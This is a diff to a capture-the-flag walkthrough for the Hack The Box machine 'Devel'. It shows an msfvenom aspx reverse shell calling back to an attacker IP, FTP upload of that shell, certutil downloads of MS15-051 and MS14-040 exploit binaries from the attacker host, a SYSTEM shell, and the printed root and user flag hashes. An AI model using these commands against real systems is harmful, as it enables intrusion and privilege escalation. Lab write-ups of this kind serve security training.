@@ -129,8 +129,9 @@ Network Card(s):           1 NIC(s) Installed.
 ```
 gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,aspx,asp -t 50
 ```
+
 ## Weaponization
-* Create aspx reverse shell and upload into FTP
+* Create aspx reverse shell using msfvenom
 ```
 msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.10.14.10 -f aspx -o reverse.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -139,8 +140,11 @@ No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of aspx file: 2747 bytes
 Saved as: reverse.aspx
+```
 
 ## Delivery and Exploitation
+* Upload aspx reverse shell into FTP and access it
+```
 ftp> put reverse.aspx
 local: reverse.aspx remote: reverse.aspx
 200 PORT command successful.
@@ -241,4 +245,83 @@ No Instance(s) Available.
 MS13-081 patch is NOT installed! (Vulns: 7SP0/SP1_x86-track_popup_menu)
 ```
 
+* Download MS15-051 exploit and fetch using certutil. Not able to escalate privilege.
+```
+kali@kali:~/HTB/devel$ searchsploit ms15-051
+kali@kali:~/HTB/devel$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37
+049-32.exe                  
 
+
+certutil -urlcache -split -f http://10.10.14.10/37049-32.exe c:\inetpub\wwwroot\37049-32.exe
+```
+
+* Repeat steps for MS14-40. Successfully Priv Esc
+
+```
+C:\inetpub\wwwroot>certutil -urlcache -split -f http://10.10.14.10/MS14-40-x86.exe c:\inetpub\wwwroot\MS14-40-x86.exe
+certutil -urlcache -split -f http://10.10.14.10/MS14-40-x86.exe c:\inetpub\wwwroot\MS14-40-x86.exe
+****  Online  ****
+  000000  ...
+  435eac
+CertUtil: -URLCache command completed successfully.
+
+C:\inetpub\wwwroot>MS14-40-x86.exe
+MS14-40-x86.exe
+whoami
+
+
+c:\Windows\System32>whoami
+whoami
+nt authority\system
+
+c:\Windows\System32>ipconfig /all
+ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : devel
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   Physical Address. . . . . . . . . : 00-50-56-B9-92-14
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.10.5(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+   DNS Servers . . . . . . . . . . . : 10.10.10.2
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.{024DBC4C-1BA9-4DFC-8341-2C35AB1DF869}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   
+c:\Users\Administrator\Desktop>type root.txt.txt
+type root.txt.txt
+e621a0b5041708797c4fc4728bc72b4b
+
+c:\Users\babis\Desktop>type user.txt.txt
+type user.txt.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+```
